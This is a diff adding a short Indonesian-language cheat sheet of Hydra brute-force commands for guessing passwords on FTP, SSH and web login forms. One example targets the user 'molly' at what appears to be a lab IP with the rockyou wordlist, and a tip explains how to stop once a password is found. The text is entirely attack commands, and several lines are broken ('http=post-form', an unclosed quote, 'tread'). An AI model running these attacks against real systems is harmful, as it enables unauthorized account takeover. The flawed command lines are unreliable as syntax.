@@ -1,0 +1,9 @@
+-> pake hydra :
+
+-> ftp:  hydra -l username -P wordlist.txt iptarget
+-> ssh:  hydra -l username -P wordlist.txt iptarget -t tread ssh
+-> form web : hydra -l username -P wordlist.txt iptarget http-post-form: "path:login_cred:invalid_response
+-> contoh formweb: hydra -l root -P wordlist.txt ip http=post-form: "/:username=^USER^&password=^PASS^:F=incorrect -V
+-> sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.166.24 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+-> gausah pake -V kalau mau ga banyak ngespam di terminal ganti jadi -f aja biar kalau nemu hydranya ke stop
+-> contoh ssh : hydra -l molly -P wordlist ip -t 4 ssh -f -V
